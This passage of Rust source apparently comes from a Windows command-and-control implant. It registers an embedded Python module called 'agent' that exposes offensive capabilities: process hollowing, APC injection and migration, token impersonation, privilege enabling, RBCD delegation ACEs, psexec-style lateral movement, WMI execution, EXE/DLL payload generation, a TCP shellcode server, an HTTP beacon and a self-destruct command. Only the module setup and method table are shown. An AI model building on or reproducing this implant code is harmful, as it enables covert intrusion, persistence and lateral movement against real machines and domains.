        inst.python.tuple_size = Some(core::mem::transmute(ptr));
    }
    if let Some(ptr) = py_unicode_as_utf8 {
        inst.python.unicode_as_utf8 = Some(core::mem::transmute(ptr));
    }
    if let Some(ptr) = py_bytes_as_string {
        inst.python.bytes_as_string = Some(core::mem::transmute(ptr));
    }
    if let Some(ptr) = py_bytes_size {
        inst.python.bytes_size = Some(core::mem::transmute(ptr));
    }
    if let Some(ptr) = py_long_as_long {
        inst.python.long_as_long = Some(core::mem::transmute(ptr));
    }
    if let Some(ptr) = py_bytes_from_string_and_size {
        inst.python.bytes_from_string_and_size = Some(core::mem::transmute(ptr));
    }
    if let Some(ptr) = py_bool_from_long {
        inst.python.bool_from_long = Some(core::mem::transmute(ptr));
    }
    if let Some(ptr) = py_err_set_string {
        inst.python.err_set_string = Some(core::mem::transmute(ptr));
    }
    if let Some(ptr) = py_err_clear {
        inst.python.err_clear = Some(core::mem::transmute(ptr));
    }
    if let Some(ptr) = py_exc_runtime_error {
        inst.python.exc_runtime_error = *(ptr as *const *mut c_void);
    }
    if let Some(none_ptr) = py_none_struct {
        inst.python.py_none = none_ptr as *mut c_void;
    }
    if let Some(ptr) = py_true_struct {
        inst.python.py_true = ptr as *mut c_void;
    }
    if let Some(ptr) = py_false_struct {
        inst.python.py_false = ptr as *mut c_void;
    }

    // Allocate method table on heap (needs to persist)
    // Using Vec to allow dynamic sizing
    let mut methods_vec: Vec<PyMethodDef> = Vec::new();

    // No-args functions
    methods_vec.push(PyMethodDef { ml_name: b"list_procs\0".as_ptr(), ml_meth: py_list_procs as *const c_void, ml_flags: METH_NOARGS, ml_doc: b"List running processes\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"get_cwd\0".as_ptr(), ml_meth: py_get_cwd as *const c_void, ml_flags: METH_NOARGS, ml_doc: b"Get current working directory\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"list_thread_privs\0".as_ptr(), ml_meth: py_list_thread_privs as *const c_void, ml_flags: METH_NOARGS, ml_doc: b"List current thread privileges\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"revert_to_self\0".as_ptr(), ml_meth: py_revert_to_self as *const c_void, ml_flags: METH_NOARGS, ml_doc: b"Revert to original token\0".as_ptr() });

    // Functions with arguments
    methods_vec.push(PyMethodDef { ml_name: b"run_command\0".as_ptr(), ml_meth: py_run_command as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Execute shell command\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"read_file\0".as_ptr(), ml_meth: py_read_file as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Read file contents\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"write_file\0".as_ptr(), ml_meth: py_write_file as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Write data to file\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"delete_file\0".as_ptr(), ml_meth: py_delete_file as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Delete a file\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"resolve_hostname\0".as_ptr(), ml_meth: py_resolve_hostname as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Resolve hostname to IP\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"shell_execute\0".as_ptr(), ml_meth: py_shell_execute as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Execute via ShellExecute\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"shell_extract\0".as_ptr(), ml_meth: py_shell_extract as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Extract ZIP file\0".as_ptr() });
    #[cfg(feature = "execution")]
    methods_vec.push(PyMethodDef { ml_name: b"shell_execute_explorer\0".as_ptr(), ml_meth: py_shell_execute_explorer as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Execute via explorer ShellExecute\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"load_library\0".as_ptr(), ml_meth: py_load_library as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Load DLL by path\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"portscan\0".as_ptr(), ml_meth: py_portscan as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Scan ports on targets\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"list_process_privs\0".as_ptr(), ml_meth: py_list_process_privs as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"List process privileges\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"impersonate_process\0".as_ptr(), ml_meth: py_impersonate_process as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Impersonate process token\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"make_token\0".as_ptr(), ml_meth: py_make_token as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Create logon token\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"enable_privilege\0".as_ptr(), ml_meth: py_enable_privilege as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Enable a privilege\0".as_ptr() });

    // Registry functions
    #[cfg(feature = "registry")]
    methods_vec.push(PyMethodDef { ml_name: b"reg_create_key\0".as_ptr(), ml_meth: py_reg_create_key as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Create registry key\0".as_ptr() });
    #[cfg(feature = "registry")]
    methods_vec.push(PyMethodDef { ml_name: b"reg_delete_key\0".as_ptr(), ml_meth: py_reg_delete_key as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Delete registry key\0".as_ptr() });
    #[cfg(feature = "registry")]
    methods_vec.push(PyMethodDef { ml_name: b"reg_set_value\0".as_ptr(), ml_meth: py_reg_set_value as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Set registry value\0".as_ptr() });
    #[cfg(feature = "registry")]
    methods_vec.push(PyMethodDef { ml_name: b"reg_query_value\0".as_ptr(), ml_meth: py_reg_query_value as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Query registry value\0".as_ptr() });

    // User/Group functions
    methods_vec.push(PyMethodDef { ml_name: b"set_user_password\0".as_ptr(), ml_meth: py_set_user_password as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Set user password\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"add_user_to_localgroup\0".as_ptr(), ml_meth: py_add_user_to_localgroup as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Add user to local group\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"remove_user_from_localgroup\0".as_ptr(), ml_meth: py_remove_user_from_localgroup as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Remove user from local group\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"get_user_sid\0".as_ptr(), ml_meth: py_get_user_sid as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Get user SID\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"add_user_to_group\0".as_ptr(), ml_meth: py_add_user_to_group as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Add user to group\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"remove_user_from_group\0".as_ptr(), ml_meth: py_remove_user_from_group as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Remove user from group\0".as_ptr() });

    // LDAP functions
    #[cfg(feature = "ad")]
    methods_vec.push(PyMethodDef { ml_name: b"query_ldap\0".as_ptr(), ml_meth: py_query_ldap as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Query LDAP\0".as_ptr() });
    #[cfg(feature = "ad")]
    methods_vec.push(PyMethodDef { ml_name: b"set_ad_attr_str\0".as_ptr(), ml_meth: py_set_ad_attr_str as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Set AD string attribute\0".as_ptr() });
    #[cfg(feature = "ad")]
    methods_vec.push(PyMethodDef { ml_name: b"set_ad_attr_bin\0".as_ptr(), ml_meth: py_set_ad_attr_bin as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Set AD binary attribute\0".as_ptr() });

    // HTTP/Network functions
    #[cfg(feature = "network")]
    methods_vec.push(PyMethodDef { ml_name: b"http_send\0".as_ptr(), ml_meth: py_http_send as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Send HTTP request\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"wmi_exec\0".as_ptr(), ml_meth: py_wmi_exec as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Execute via WMI\0".as_ptr() });
    #[cfg(feature = "bof")]
    methods_vec.push(PyMethodDef { ml_name: b"run_bof\0".as_ptr(), ml_meth: py_run_bof as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Run BOF\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"hollow\0".as_ptr(), ml_meth: py_hollow as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Process hollowing\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"apc_injection\0".as_ptr(), ml_meth: py_apc_injection as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"APC injection\0".as_ptr() });
    #[cfg(feature = "execution")]
    methods_vec.push(PyMethodDef { ml_name: b"sacrificial\0".as_ptr(), ml_meth: py_sacrificial as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Sacrificial process execution\0".as_ptr() });
    #[cfg(feature = "execution")]
    methods_vec.push(PyMethodDef { ml_name: b"create_thread\0".as_ptr(), ml_meth: py_create_thread as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Spawn thread with task set\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"register_service\0".as_ptr(), ml_meth: py_register_service as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Register as Windows service\0".as_ptr() });
    #[cfg(feature = "services")]
    methods_vec.push(PyMethodDef { ml_name: b"start_service\0".as_ptr(), ml_meth: py_start_service as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Start a Windows service\0".as_ptr() });
    #[cfg(feature = "services")]
    methods_vec.push(PyMethodDef { ml_name: b"delete_service\0".as_ptr(), ml_meth: py_delete_service as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Delete a Windows service\0".as_ptr() });
    #[cfg(feature = "ad")]
    methods_vec.push(PyMethodDef { ml_name: b"create_rbcd_ace\0".as_ptr(), ml_meth: py_create_rbcd_ace as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Create RBCD ACE bytes for a SID\0".as_ptr() });

    // Frida functions
    #[cfg(feature = "frida")]
    methods_vec.push(PyMethodDef { ml_name: b"frida_hook\0".as_ptr(), ml_meth: py_frida_hook as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Install Frida JavaScript hook\0".as_ptr() });
    #[cfg(feature = "frida")]
    methods_vec.push(PyMethodDef { ml_name: b"frida_unhook\0".as_ptr(), ml_meth: py_frida_unhook as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Unload Frida hook\0".as_ptr() });

    // Memory functions
    methods_vec.push(PyMethodDef { ml_name: b"mem_read\0".as_ptr(), ml_meth: py_mem_read as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Read memory at address\0".as_ptr() });
    #[cfg(feature = "mal")]
    methods_vec.push(PyMethodDef { ml_name: b"dll_list\0".as_ptr(), ml_meth: py_dll_list as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"List loaded modules\0".as_ptr() });
    #[cfg(feature = "mal")]
    methods_vec.push(PyMethodDef { ml_name: b"mem_map\0".as_ptr(), ml_meth: py_mem_map as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Enumerate memory regions\0".as_ptr() });
    #[cfg(feature = "mal")]
    methods_vec.push(PyMethodDef { ml_name: b"malfind\0".as_ptr(), ml_meth: py_malfind as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Find injected code\0".as_ptr() });
    #[cfg(feature = "mal")]
    methods_vec.push(PyMethodDef { ml_name: b"ldr_check\0".as_ptr(), ml_meth: py_ldr_check as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Check for unlinked DLLs\0".as_ptr() });

    // Misc / control
    methods_vec.push(PyMethodDef { ml_name: b"sleep\0".as_ptr(), ml_meth: py_sleep as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Sleep for milliseconds\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"exit_process\0".as_ptr(), ml_meth: py_exit_process as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Terminate process\0".as_ptr() });
    methods_vec.push(PyMethodDef { ml_name: b"kill\0".as_ptr(), ml_meth: py_kill as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Kill agent or self-destruct\0".as_ptr() });

    // Migration / injection continuations
    #[cfg(feature = "execution")]
    methods_vec.push(PyMethodDef { ml_name: b"migrate\0".as_ptr(), ml_meth: py_migrate as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Migrate to another process\0".as_ptr() });
    #[cfg(feature = "execution")]
    methods_vec.push(PyMethodDef { ml_name: b"migrate_apc\0".as_ptr(), ml_meth: py_migrate_apc as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Migrate via APC injection\0".as_ptr() });
    #[cfg(feature = "execution")]
    methods_vec.push(PyMethodDef { ml_name: b"hollow_apc\0".as_ptr(), ml_meth: py_hollow_apc as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Hollow + APC inject new process\0".as_ptr() });

    // Payload generation
    #[cfg(feature = "payload_gen")]
    methods_vec.push(PyMethodDef { ml_name: b"generate_exe\0".as_ptr(), ml_meth: py_generate_exe as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Generate EXE payload\0".as_ptr() });
    #[cfg(feature = "payload_gen")]
    methods_vec.push(PyMethodDef { ml_name: b"generate_dll\0".as_ptr(), ml_meth: py_generate_dll as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Generate DLL payload\0".as_ptr() });
    #[cfg(all(feature = "network", feature = "payload_gen"))]
    methods_vec.push(PyMethodDef { ml_name: b"shellcode_server\0".as_ptr(), ml_meth: py_shellcode_server as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Serve shellcode over TCP\0".as_ptr() });

    // Lateral movement
    #[cfg(feature = "lateral_movement")]
    methods_vec.push(PyMethodDef { ml_name: b"psexec\0".as_ptr(), ml_meth: py_psexec as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"Execute via service installation\0".as_ptr() });

    // C2 sessions
    #[cfg(feature = "c2")]
    methods_vec.push(PyMethodDef { ml_name: b"http_beacon\0".as_ptr(), ml_meth: py_http_beacon as *const c_void, ml_flags: METH_VARARGS, ml_doc: b"HTTP beacon session\0".as_ptr() });

    // Terminator
    methods_vec.push(PyMethodDef { ml_name: core::ptr::null(), ml_meth: core::ptr::null(), ml_flags: 0, ml_doc: core::ptr::null() });

    // Convert Vec to boxed slice and leak it
    let methods_boxed = methods_vec.into_boxed_slice();
    let methods_ptr = Box::into_raw(methods_boxed) as *const PyMethodDef;

    // Allocate module def on heap
    let mut module_def = Box::new(PyModuleDef {
        ob_base: [1, 0],
        m_init: core::ptr::null(),
        m_index: 0,
        m_copy: core::ptr::null(),
        m_name: b"agent\0".as_ptr(),
        m_doc: b"Agent module - provides access to agent functions\0".as_ptr(),
        m_size: -1,
        m_methods: methods_ptr,
        m_slots: core::ptr::null(),
        m_traverse: core::ptr::null(),
        m_clear: core::ptr::null(),
        m_free: core::ptr::null(),
    });

    // Create module
    let module_create: PyModuleCreate2 = core::mem::transmute(py_module_create.unwrap());
    let module = module_create(&mut *module_def, 1013);

    // Leak the box so it stays alive (Python holds reference)
    Box::into_raw(module_def);

    if module.is_null() {
        return;
    }

    // Add to sys.modules
    let get_modules: PyImportGetModuleDict = core::mem::transmute(py_import_get_module_dict.unwrap());
    let dict_set: PyDictSetItemString = core::mem::transmute(py_dict_set_item_string.unwrap());

    let sys_modules = get_modules();
    if !sys_modules.is_null() {
        dict_set(sys_modules, b"agent\0".as_ptr(), module);
    }
}
